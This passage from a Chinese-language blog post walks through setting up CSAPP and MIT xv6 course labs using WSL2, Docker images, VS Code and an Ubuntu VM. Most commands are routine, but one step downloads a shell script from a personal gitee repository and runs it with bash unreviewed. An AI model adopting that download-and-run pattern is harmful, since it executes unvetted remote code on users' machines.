<p>然后下载Linux的内核更新包并安装 x64：<a href="https://link.juejin.cn/?target=https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi">wslstorestorage.blob.core.windows.net&#x2F;wslblob&#x2F;wsl…</a></p>
<p>仍然是管理员权限下打开终端，先查看更新前的WSL版本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">复制代码wsl -l -v</span><br></pre></td></tr></table></figure>

<p>输入更新的命令：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">arduino</span><br><span class="line">复制代码wsl.exe --set-version Ubuntu <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>更新命令有的用的：<code>wsl --set-version Ubuntu 2</code>，但是在我的电脑上报错：不存在具有提供的名称的分布。 解决方法就是把wsl改成wsl.exe.</p>
<p>如果未安装Linux发行版，也可以上Microsoft Store上直接安装</p>
<p>最后看看版本号是否为2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">复制代码wsl -l -v</span><br></pre></td></tr></table></figure>



<h1 id="Docker的安装"><a href="#Docker的安装" class="headerlink" title="Docker的安装"></a>Docker的安装</h1><blockquote>
<p>建议直接官网下载</p>
</blockquote>
<p><a href="https://docs.docker.com/desktop/install/windows-install/">DOCKER FOR WINDOWS</a></p>
<p><a href="https://docs.docker.com/desktop/install/mac-install/">DOCKER FOR LINUX</a></p>
<p><a href="https://docs.docker.com/desktop/install/mac-install/">DOCKER FOR MAC</a></p>
<p><strong>对于mac用户而言，直接去官网上下载docker，注意intel和apple版本</strong></p>
<h1 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h1><h2 id="Docker-Csapp环境安装"><a href="#Docker-Csapp环境安装" class="headerlink" title="Docker+Csapp环境安装"></a>Docker+Csapp环境安装</h2><ol>
<li>打开Docker，打开CMD（windows）或者终端（mac），刷入以下命令拉取镜像。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 下载镜像</span><br><span class="line">docker pull linxi177229/csapp:latest</span><br><span class="line"># 查看</span><br><span class="line">docker images</span><br><span class="line"># 启动容器（里面有配置好的环境 和 PDF 资料）</span><br><span class="line">docker run --name csapp -itd linxi177229/csapp</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>打开VScode，在扩展市场安装Docker插件，然后进入，右键对应容器，选择<strong>附加VisualStudioCode</strong>，然后vscode会自动挂载容器，会弹出一个新的窗口。</p>
</li>
<li><p>开始愉快的实验吧！</p>
</li>
<li><p>测试环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 接下来就和使用 平常的 Ubuntu：20.04 一样了</span><br><span class="line"># 进入 lab1 进行一个简单的测试</span><br><span class="line">cd ~</span><br><span class="line">ls</span><br><span class="line">cd csapplab</span><br><span class="line">cd datalab/datalab-handout</span><br><span class="line">make clean &amp;&amp; make &amp;&amp; ./btest</span><br></pre></td></tr></table></figure>
</li>
<li><p>GDB安装</p>
</li>
</ol>
<p>在这个doker中默认是没有安装gdb的,所以为了在bomblab中进行gdb的使用,我们需要在doker中安装gdb,该doker镜像是基于ubuntu20.04的,故我们直接在终端使用命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install  gdb</span><br></pre></td></tr></table></figure>

<p>安装好后,cd到bomb的文件夹内,输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb bomb</span><br></pre></td></tr></table></figure>

<p>然后开始实验吧!<del>这个点废了我一个晚上才弄明白</del></p>
<h2 id="Ubuntu虚拟机安装CSAPP环境"><a href="#Ubuntu虚拟机安装CSAPP环境" class="headerlink" title="Ubuntu虚拟机安装CSAPP环境"></a>Ubuntu虚拟机安装CSAPP环境</h2><ol>
<li><p>虚拟机 安装 Ubuntu20.04，这个比较简单，找一篇博客就行，<strong>不过记得用 VMware pro 16，很方便 ssh，如果电脑配置不高，记得 Ubuntu 用 server版本。而不是 desktop</strong></p>
</li>
<li><p>CSAPP 环境配置，首先如果你用的是 Ubuntu20.04 及以下，那么你可以直接运行下面的脚本，就可以安装好 操作都很简单，就几行命令而已，Docker 方法适用性更加广，目前大多数操作系统都支持。</p>
</li>
</ol>
<p>这个脚本是 20.04 及以下都可以完全配置好的，并且有附带的 PDF，如果是 Ubuntu 21及 以上需要在 lab4 的时候降低 gcc 版本。</p>
<p>选择自己想要做项目的文件夹,cd到文件夹中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://gitee.com/lin-xi-269/csapplab/raw/origin/installAll.sh <span class="comment"># 下载脚本</span></span><br><span class="line">bash installAll.sh <span class="comment"># 运行脚本</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>运行完 这个脚本之后，<strong>会在 当前目录下创建一个 csapp 文件夹，里面包含 8个 lab 按照 PDF 开始做即可以开始做了。</strong></li>
</ol>
<p>然后可以用vscode远程链接ubuntu,通过ssh,然后测试环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 接下来就和使用 平常的 Ubuntu：20.04 一样了</span><br><span class="line"># 进入 lab1 进行一个简单的测试</span><br><span class="line">cd ~</span><br><span class="line">ls</span><br><span class="line">cd csapplab</span><br><span class="line">cd datalab/datalab-handout</span><br><span class="line">make clean &amp;&amp; make &amp;&amp; ./btest</span><br></pre></td></tr></table></figure>



<h2 id="Docker-XV6环境安装"><a href="#Docker-XV6环境安装" class="headerlink" title="Docker+XV6环境安装"></a>Docker+XV6环境安装</h2><ol>
<li>打开Docker，打开CMD（windows）或者终端（mac），刷入以下命令拉取镜像。这个 images （400多MB）开箱即用,环境已经配置好了。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#下载镜像</span><br><span class="line">docker pull linxi177229/mit6.s081:latest</span><br><span class="line"># 查看</span><br><span class="line">docker images</span><br><span class="line"># 启动容器（里面有配置好的环境 和 PDF 资料）</span><br><span class="line">docker run --name xv6 -itd linxi177229/mit6.s081:latest</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>打开VScode，在扩展市场安装Docker插件，然后进入，右键对应容器，选择<strong>附加VisualStudioCode</strong>，然后vscode会自动挂载容器，会弹出一个新的窗口。</li>
<li>开始愉快的实验吧！</li>
<li>测试环境</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd xv6-labs-2020</span><br><span class="line"></span><br><span class="line">make qemu # 开启一个 shell 手动运行那些 usr/ 下的程序来测试</span><br><span class="line"></span><br><span class="line"> #看目录下的各级目录</span><br><span class="line"> ls</span><br><span class="line"> </span><br><span class="line"># 自动化测试：make grade 可以获得得分情况</span><br><span class="line">make grade</span><br><span class="line"></span><br><span class="line"># 或者可以使用 进行单个测试</span><br><span class="line">./grade-具体lab名字 part名字</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>退出方式</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在另一个新开的终端执行 </span></span><br><span class="line">pkill -f qemu  </span><br></pre></td></tr></table></figure>

<ol start="6">
<li>调试方法 GDB</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第一个 terminal</span></span><br><span class="line"><span class="built_in">cd</span> xv6-labs-2020</span><br><span class="line"><span class="comment"># 第一次执行 gdb 需要 执行 下面条语句 </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;add-auto-load-safe-path <span class="subst">$(pwd)</span>/.gdbinit &quot;</span> &gt;&gt; ~/.gdbinit </span><br><span class="line"><span class="comment"># 第一次执行</span></span><br><span class="line">make CPUS=1 qemu-gdb</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二个 terminal</span></span><br><span class="line"><span class="built_in">cd</span> xv6-labs-2020</span><br><span class="line">gdb-multiarch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接下来就和使用 平常的 gdb 一样了， layout split 是一个很棒的用法</span></span><br><span class="line"><span class="comment"># 在 gdb 中输入 kill 即可 退出</span></span><br><span class="line"><span class="comment"># 或者 在第三个 teminal 中输入 pkill -f qemu 也可以退出</span></span><br></pre></td></tr></table></figure>

<p><a href="https://pic.imgdb.cn/item/65a3b3dd871b83018aa931bf.jpg"><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315207.jpg"></a></p>
<h2 id="环境安装时的截图"><a href="#环境安装时的截图" class="headerlink" title="环境安装时的截图"></a>环境安装时的截图</h2><h3 id="CMD截图"><a href="#CMD截图" class="headerlink" title="CMD截图"></a>CMD截图</h3><p><a href="https://pic.imgdb.cn/item/65a3b395871b83018aa824cd.jpg"><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315215.jpg"></a></p>
<h3 id="Docker截图"><a href="#Docker截图" class="headerlink" title="Docker截图"></a>Docker截图</h3><p><a href="https://pic.imgdb.cn/item/65a3b5d3871b83018aafffff.jpg"><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315227.jpg"></a></p>
<h3 id="Vscode截图"><a href="#Vscode截图" class="headerlink" title="Vscode截图"></a>Vscode截图</h3><p><a href="https://pic.imgdb.cn/item/65a3b64c871b83018ab1ab98.jpg"><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315236.jpg"></a></p>
<blockquote>
<p>配置环境主打一个能用就好，不要过多的纠结。</p>
</blockquote>
<h1 id="Good-Luck"><a href="#Good-Luck" class="headerlink" title="Good Luck"></a>Good Luck</h1><blockquote>
<p>菜就多练，输不起就别玩</p>
<p><a href="https://pic.imgdb.cn/item/65a3b50a871b83018aad5026.jpg"><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315248.jpg"></a></p>
</blockquote>
]]></content>
      <categories>
        <category>EATPOOP</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
</search>
